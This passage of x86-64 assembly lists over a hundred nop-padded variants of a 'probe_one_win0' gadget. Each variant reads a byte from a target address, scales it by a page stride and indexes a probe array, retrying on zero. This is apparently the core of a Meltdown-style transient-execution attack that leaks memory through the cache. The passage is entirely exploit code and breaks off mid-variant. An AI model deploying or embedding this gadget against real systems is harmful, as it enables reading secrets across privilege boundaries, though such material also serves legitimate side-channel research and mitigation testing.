## Variant 88
.Lprobe_one_win0_var88:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 89
.Lprobe_one_win0_var89:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 90
.Lprobe_one_win0_var90:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 91
.Lprobe_one_win0_var91:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 92
.Lprobe_one_win0_var92:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 93
.Lprobe_one_win0_var93:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 94
.Lprobe_one_win0_var94:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 95
.Lprobe_one_win0_var95:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 96
.Lprobe_one_win0_var96:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 97
.Lprobe_one_win0_var97:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 98
.Lprobe_one_win0_var98:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 99
.Lprobe_one_win0_var99:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 100
.Lprobe_one_win0_var100:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 101
.Lprobe_one_win0_var101:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 102
.Lprobe_one_win0_var102:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 103
.Lprobe_one_win0_var103:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 104
.Lprobe_one_win0_var104:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 105
.Lprobe_one_win0_var105:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 106
.Lprobe_one_win0_var106:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 107
.Lprobe_one_win0_var107:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 108
.Lprobe_one_win0_var108:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 109
.Lprobe_one_win0_var109:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 110
.Lprobe_one_win0_var110:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 111
.Lprobe_one_win0_var111:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 112
.Lprobe_one_win0_var112:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 113
.Lprobe_one_win0_var113:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 114
.Lprobe_one_win0_var114:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 115
.Lprobe_one_win0_var115:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 116
.Lprobe_one_win0_var116:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 117
.Lprobe_one_win0_var117:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 118
.Lprobe_one_win0_var118:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 119
.Lprobe_one_win0_var119:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 120
.Lprobe_one_win0_var120:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 121
.Lprobe_one_win0_var121:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 122
.Lprobe_one_win0_var122:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 123
.Lprobe_one_win0_var123:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 124
.Lprobe_one_win0_var124:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 125
.Lprobe_one_win0_var125:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 126
.Lprobe_one_win0_var126:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 127
.Lprobe_one_win0_var127:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 128
.Lprobe_one_win0_var128:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 129
.Lprobe_one_win0_var129:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 130
.Lprobe_one_win0_var130:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 131
.Lprobe_one_win0_var131:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 132
.Lprobe_one_win0_var132:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 133
.Lprobe_one_win0_var133:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 134
.Lprobe_one_win0_var134:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 135
.Lprobe_one_win0_var135:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 136
.Lprobe_one_win0_var136:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 137
.Lprobe_one_win0_var137:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 138
.Lprobe_one_win0_var138:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 139
.Lprobe_one_win0_var139:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 140
.Lprobe_one_win0_var140:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 141
.Lprobe_one_win0_var141:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 142
.Lprobe_one_win0_var142:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 143
.Lprobe_one_win0_var143:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 144
.Lprobe_one_win0_var144:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 145
.Lprobe_one_win0_var145:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 146
.Lprobe_one_win0_var146:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 147
.Lprobe_one_win0_var147:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 148
.Lprobe_one_win0_var148:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 149
.Lprobe_one_win0_var149:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 150
.Lprobe_one_win0_var150:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 151
.Lprobe_one_win0_var151:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 152
.Lprobe_one_win0_var152:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 153
.Lprobe_one_win0_var153:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 154
.Lprobe_one_win0_var154:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 155
.Lprobe_one_win0_var155:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 156
.Lprobe_one_win0_var156:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 157
.Lprobe_one_win0_var157:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 158
.Lprobe_one_win0_var158:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 159
.Lprobe_one_win0_var159:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 160
.Lprobe_one_win0_var160:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 161
.Lprobe_one_win0_var161:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 162
.Lprobe_one_win0_var162:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 163
.Lprobe_one_win0_var163:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 164
.Lprobe_one_win0_var164:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 165
.Lprobe_one_win0_var165:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 166
.Lprobe_one_win0_var166:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 167
.Lprobe_one_win0_var167:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 168
.Lprobe_one_win0_var168:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 169
.Lprobe_one_win0_var169:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 170
.Lprobe_one_win0_var170:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 171
.Lprobe_one_win0_var171:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 172
.Lprobe_one_win0_var172:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 173
.Lprobe_one_win0_var173:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 174
.Lprobe_one_win0_var174:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 175
.Lprobe_one_win0_var175:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 176
.Lprobe_one_win0_var176:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 177
.Lprobe_one_win0_var177:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 178
.Lprobe_one_win0_var178:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 179
.Lprobe_one_win0_var179:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 180
.Lprobe_one_win0_var180:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 181
.Lprobe_one_win0_var181:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 182
.Lprobe_one_win0_var182:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 183
.Lprobe_one_win0_var183:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 184
.Lprobe_one_win0_var184:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 185
.Lprobe_one_win0_var185:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 186
.Lprobe_one_win0_var186:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 187
.Lprobe_one_win0_var187:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 188
.Lprobe_one_win0_var188:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 189
.Lprobe_one_win0_var189:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 190
.Lprobe_one_win0_var190:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 191
.Lprobe_one_win0_var191:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 192
.Lprobe_one_win0_var192:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
